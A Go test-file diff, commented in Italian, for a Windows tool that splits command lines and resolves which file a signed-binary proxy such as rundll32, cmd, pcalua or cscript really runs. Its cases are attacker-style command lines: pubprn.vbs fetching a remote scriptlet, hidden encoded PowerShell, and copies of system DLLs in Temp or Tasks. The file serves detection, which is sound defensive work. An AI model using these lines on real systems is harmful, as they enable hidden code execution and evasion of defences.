@@ -152,6 +152,18 @@ func TestSplit(t *testing.T) {
 			t.Errorf("Split(%q) = %q, atteso %q", in, f, want)
 		}
 	}
+	// Un file che esiste vale anche oltre un pezzo che sembra un'opzione,
+	// come per CreateProcess; se manca, il file si ferma prima.
+	r = newFakeEnv(`C:\Program Files\Foo -Bar Baz\a.exe`).resolver()
+	for in, want := range map[string]string{
+		`C:\Program Files\Foo -Bar Baz\a.exe /x`:      `C:\Program Files\Foo -Bar Baz\a.exe`,
+		`C:\Program Files\Manca -Beta 2\a.exe /x`:     `C:\Program`,
+		`C:\Program Files\Manca\a.exe -File C:\x.ps1`: `C:\Program Files\Manca\a.exe`,
+	} {
+		if f, _, _ := r.Split(in, false); f != want {
+			t.Errorf("Split(%q) = %q, atteso %q", in, f, want)
+		}
+	}
 }
 
 // Le voci delle attività e delle chiavi Run scritte senza estensione non
@@ -288,6 +300,30 @@ func TestProxyTarget(t *testing.T) {
 		// Script di sistema che eseguono ciò che ricevono (T1216).
 		{`cscript.exe`, `/b C:\Windows\System32\Printing_Admin_Scripts\it-IT\pubprn.vbs 127.0.0.1 script:https://x/y.sct`, ``, true},
 		{`cscript.exe`, `/b C:\Users\anna\pubprn.vbs 127.0.0.1`, `C:\Users\anna\pubprn.vbs`, true},
+		// Una copia di un programma o di una DLL di Windows in una sua
+		// sottocartella scrivibile dagli utenti (Temp, Tasks) è il file
+		// eseguito, non quello di Windows.
+		{`rundll32.exe`, `C:\Windows\Temp\shell32.dll,ShellExec_RunDLL C:\Windows\System32\notepad.exe`, `C:\Windows\Temp\shell32.dll`, true},
+		{`rundll32.exe`, `%windir%\Tasks\url.dll,FileProtocolHandler C:\Windows\notepad.exe`, `%windir%\Tasks\url.dll`, true},
+		{`cmd.exe`, `/c C:\Windows\Tasks\cmd.exe /c C:\Windows\System32\notepad.exe`, `C:\Windows\Tasks\cmd.exe`, true},
+		{`cmd.exe`, `/c C:\Windows\System32\..\Tasks\cmd.exe /c x`, `C:\Windows\System32\..\Tasks\cmd.exe`, true},
+		{`cmd.exe`, `/c C:\Windows\..\Tools\cmd.exe /c x`, `C:\Windows\..\Tools\cmd.exe`, true},
+		{`cmd.exe`, `/c C:\Windows\Temp\..\System32\cmd.exe /c C:\Users\anna\x.bat`, `C:\Users\anna\x.bat`, true},
+		{`cmd.exe`, `/c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe C:\x\a.dll`, `C:\x\a.dll`, true},
+		{`cmd.exe`, `/c %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -enc AAAA`, ``, true},
+		// Una DLL lanciatrice che apre un altro programma di Windows che
+		// esegue un comando (LOLBAS: ShellExec_RunDLL "cmd.exe" "/c ...").
+		{`rundll32.exe`, `shell32.dll,ShellExec_RunDLL cmd.exe /c C:\Windows\System32\notepad.exe`, `C:\Windows\System32\notepad.exe`, true},
+		{`rundll32.exe`, `SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c echo hi"`, ``, true},
+		{`rundll32.exe`, `url.dll,FileProtocolHandler powershell.exe -w hidden -enc AAAA`, ``, true},
+		{`pcalua.exe`, `-a C:\Windows\System32\cmd.exe -c "/c calc"`, ``, true},
+		{`explorer.exe`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, ``, true},
+		{`pcalua.exe`, `-a C:\Users\anna\x.exe`, `C:\Users\anna\x.exe`, true},
+		// PowerShell 7 nella sua cartella è l'interprete; una copia altrove no.
+		{`cmd.exe`, `/c "C:\Program Files\PowerShell\7\pwsh.exe" -w hidden -enc AAAA`, ``, true},
+		{`cmd.exe`, `/c %ProgramFiles%\PowerShell\7-preview\pwsh.exe -c x`, ``, true},
+		{`cmd.exe`, `/c "C:\Program Files\PowerShell\Tools\x\pwsh.exe" -c x`, `C:\Program Files\PowerShell\Tools\x\pwsh.exe`, true},
+		{`cmd.exe`, `/c C:\Users\anna\pwsh.exe -c x`, `C:\Users\anna\pwsh.exe`, true},
 	} {
 		got, proxy := ProxyTarget(c.file, c.args)
 		if got != c.target || proxy != c.proxy {
